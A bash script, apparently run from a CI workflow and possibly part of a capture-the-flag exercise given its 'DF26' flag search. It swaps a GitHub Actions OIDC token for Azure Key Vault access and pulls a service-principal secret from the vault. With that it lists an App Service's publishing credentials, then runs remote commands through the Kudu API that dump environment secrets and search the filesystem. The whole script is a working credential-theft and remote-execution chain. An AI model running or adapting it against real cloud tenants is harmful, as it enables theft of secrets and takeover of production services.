#!/usr/bin/env bash
set -uo pipefail
SUB=c5e4e004-b42d-4ac4-a502-5fd338380eb6
RAPP="/subscriptions/$SUB/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Web/sites/app-tbl-reporting-prod"
SCM="https://app-tbl-reporting-prod.scm.azurewebsites.net"
API=2022-03-01
OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r '.value')
KV=$(curl -sS -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" -d "client_id=$AZURE_CLIENT_ID" -d "scope=https://vault.azure.net/.default" -d "grant_type=client_credentials" -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" -d "client_assertion=$OIDC" | jq -r '.access_token // empty')
J=$(curl -sS -H "Authorization: Bearer $KV" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/reporting-service-principal?api-version=7.4" | jq -r '.value')
RS=$(curl -sS -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" -d "client_id=$(echo "$J"|jq -r .appId)" -d "client_secret=$(echo "$J"|jq -r .clientSecret)" -d "scope=https://management.azure.com/.default" -d "grant_type=client_credentials" | jq -r '.access_token // empty')
PUB=$(curl -sS -X POST -H "Authorization: Bearer $RS" -H "Content-Length: 0" "https://management.azure.com$RAPP/config/publishingcredentials/list?api-version=$API")
U=$(echo "$PUB"|jq -r '.properties.publishingUserName'); P=$(echo "$PUB"|jq -r '.properties.publishingPassword')

echo "== HTTP codes =="
for ep in /api/command /api/vfs/site/wwwroot/ /api/settings /api/environment; do
  echo -n "$ep -> "; curl -sS -o /dev/null -w "%{http_code}\n" -u "$U:$P" "$SCM$ep" || echo err
done
echo "== CMD: pwd/id/env grep =="
curl -sS -u "$U:$P" "$SCM/api/command" -H "Content-Type: application/json" \
  -d '{"command":"pwd; id; echo --ENV--; printenv | grep -iE \"DF26|FLAG|DOJO|SECRET|TOKEN|KEY\"; echo --FIND--; grep -rIaoE \"DF26[{][^}]*[}]\" / 2>/dev/null | head","dir":"site/wwwroot"}'
echo
echo "== VFS wwwroot (recursive) =="
curl -sS -u "$U:$P" "$SCM/api/vfs/site/wwwroot/?recursive=true"
echo DONE; exit 0
